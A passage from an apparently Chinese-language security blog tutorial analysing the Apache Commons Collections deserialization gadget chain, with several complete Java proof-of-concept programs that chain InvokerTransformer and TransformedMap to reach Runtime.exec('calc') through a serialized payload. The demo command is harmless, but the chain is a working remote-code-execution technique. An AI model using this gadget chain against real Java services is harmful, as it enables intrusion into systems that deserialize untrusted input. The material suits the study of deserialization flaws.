class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">inv</span> <span class="operator">=</span> (ChainedTransformer) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        inv.transform(<span class="string">"Anchor"</span>);<span class="comment">//这里任何值都可以</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>成功弹出计算器！</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121152737069.png" alt="成功弹出计算器"></p><p>看到这里我是真的很佩服构造这个利用链的大佬，能够构造地这么巧妙！</p><p>不过还没完，就这样漏洞触发的条件依旧苛刻，仍需要开发者在服务端将object转换为<code>ChainedTransformer</code>类型，且执行<code>transform</code>方法，我们还需要进一步扩大漏洞触发范围。</p><h3 id="4-TransformedMap类"><a href="#4-TransformedMap类" class="headerlink" title="4 TransformedMap类"></a>4 TransformedMap类</h3><p>前面也提到过该类，该类是对 Java 标准数据结构 <code>Map</code> 接口的一个扩展，该类位于<code>org.apache.commons.collections.map</code>包中</p><p>该类中我们可以看到以下方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> {</span><br><span class="line">    <span class="comment">//若keyTransformer不为null，则执行其transform方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.keyTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.keyTransformer.transform(object);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> {</span><br><span class="line">    <span class="comment">//若valueTransformer不为null，则执行其transform方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer == <span class="literal">null</span> ? object : <span class="built_in">this</span>.valueTransformer.transform(object);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> {</span><br><span class="line">        key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">        value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><h4 id="put"><a href="#put" class="headerlink" title="put()"></a>put()</h4><p>虽然前三个方法中都有我们想要的调用transform方法，但是由于属性均为protected，非子类的话，是无法被外界访问的。不过可以借助第四个方法————<code>put()</code>，该方法中就调用了前面两个方法，那也就可以间接调用transform方法了。</p><p>那么问题来了，其中的keyTransformer和valueTransformer是否是我们可控的？</p><p>还是一样的，跟进到构造函数中一探究竟。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>我们可以看到，构造函数的属性也是<code>protected</code>，也就是说，在别的包中，我们是无法通过new来实例化一个TransformedMap类的对象的，那也就是说，无法通过该处构造函数实现传入构造的利用链了。那就没办法了不？</p><p>我们把目标锁定在另外的一个静态方法<code>decorate()</code>上：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>可以看到该静态方法可以直接返回一个TransformedMap实例，并且该静态方法是<code>public</code>属性，那么问题迎刃而解了，我们可以<code>TransformedMap.decorate()</code>来获取一个<code>TransformedMap</code>实例，其中的keyTransformer或是valueTransformer参数处传入我们构造好几次的transformer链，那么接下来poc改造如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"123"</span>,<span class="string">"456"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//final malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(myMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapObj</span> <span class="operator">=</span> (Map) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        mapObj.put(<span class="string">"anchor"</span>,<span class="string">"anch0r"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>nice，计算器还是照常弹出。</p><p>到了这一步，漏洞的范围就很大了，因为已经接触到我们常用的Map数据结构和其put()方法了。但这还是不太理想，我们更理想化的攻击方式是，服务器端只要反序列化<code>readObject()</code>就能触发反序列化漏洞。可惜的是，安全研究的大佬们发现并未有满足重写了<code>readObject()</code>方法且方法内可以调用<code>MapObj.put()</code>方法条件的Class。</p><h4 id="checkSetValue"><a href="#checkSetValue" class="headerlink" title="checkSetValue()"></a>checkSetValue()</h4><p>注意到上面这个poc只是利用了其中我提到的<code>transformKey</code>、 <code>transformValue</code>以及<code>put</code>方法，其中有个方法我还没提，就是<code>checkSetValue()</code>方法：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里面也调用了我们想要的transform方法，但是该方法也是protected属性来修饰的，不能直接利用,我们可以看看其他有哪个地方调用了这个<code>checkSetValue</code>方法。该方法其实是由<code>TransformedMap</code>继承自<code>AbstractInputCheckedMapDecorator</code>类,我们就先跟进这个类中看看。</p><p>在该类中又有个<code>MapEntry</code>类，其中<code>setValue</code>方法中调用了checkSetValue方法。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121162933292.png" alt="MapEntry类"></p><p>显然，现在我们只需要确保<code>this.parent</code>指向的是<code>TransformedMap</code>类的对象就可以了。那就继续看看<code>this.parent</code>在哪些地方被赋值了。、</p><p>可以看到分别可以在当前类文件的<code>EntrySetIterator</code>类和<code>EntrySet</code>类的构造函数中赋值：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121163506413.png" alt="this.parent赋值的地方"></p><p>但这是<strong>不同</strong>Class的<code>parent</code>，我们需要的是<code>MapEntry</code>里的<code>parent</code>，继续查看代码，发现：<code>EntrySetIterator</code>中的next()方法会将自身的<code>parent</code>传入<code>MapEntry</code>，而<code>EntrySet</code>的<code>iterator</code>方法又会创建一个新的<code>EntrySetIterator</code>，将它的parent传入<code>EntrySetIterator</code>，这样就连起来了 <code>new EntrySet(set,parent).iterator().next()</code>就能够传入我们的parent：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121163937101.png" alt="连起来了"></p><p>接着我们发现，<code>AbstractInputCheckedMapDecorator</code>里还有一个<code>entrySet()</code>，因为我们的<code>TransformedMap</code>就是它的子类，所以我们可以直接用我们的<code>TransformedMap</code>去调用这个方法,一切就连起来了。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> {</span><br><span class="line">    <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">EntrySet</span>(<span class="built_in">super</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">super</span>.map.entrySet());</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>于是POC改造：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"123"</span>,<span class="string">"456"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map.Entry) myMap.entrySet().iterator().next();<span class="comment">//传入parent</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(finalMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">"payload.bin"</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) objectInputStream.readObject();</span><br><span class="line">        entry.setValue(<span class="string">"Anch0r"</span>);<span class="comment">//触发漏洞</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里又发现了NotSerializableException错误，其中的<code>MapEntry</code>是不可序列化的。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240121164539714.png" alt="NotSerializableException"></p><p>这里就不通过序列化和反序列化表现了，直接删除序列化和反序列化的代码查看结果：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException {</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]{</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"getDeclaredMethod"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class,Class[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="string">"getRuntime"</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"invoke"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{Object.class,Object[].class}, <span class="keyword">new</span> <span class="title class_">Object</span>[]{<span class="literal">null</span>,<span class="literal">null</span>}),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用构造方法对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">"exec"</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]{String.class}, <span class="keyword">new</span> <span class="title class_">String</span>[]{<span class="string">"calc"</span>})</span><br><span class="line">        };</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">"123"</span>,<span class="string">"456"</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map.Entry) myMap.entrySet().iterator().next();<span class="comment">//传入parent</span></span><br><span class="line">        finalMap.setValue(<span class="string">"anch0r"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>成功弹窗！</p><h3 id="5-AnotationInvocationHandler类"><a href="#5-AnotationInvocationHandler类" class="headerlink" title="5. AnotationInvocationHandler类"></a>5. AnotationInvocationHandler类</h3><p><code>AnotationInvocationHandler</code>类不是<code>Commons Collections</code>包中的内容了，它是jdk包中自带的类，位于<code>sun.reflect.annotation.AnotationInvocationHandler</code>,这个类很完美，因为它有一个自己的<code>readObject</code>方法，就是说该类可以配合实现反序列化漏洞。</p><p>我们就先来分析它的<code>readObject</code>方法的源码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 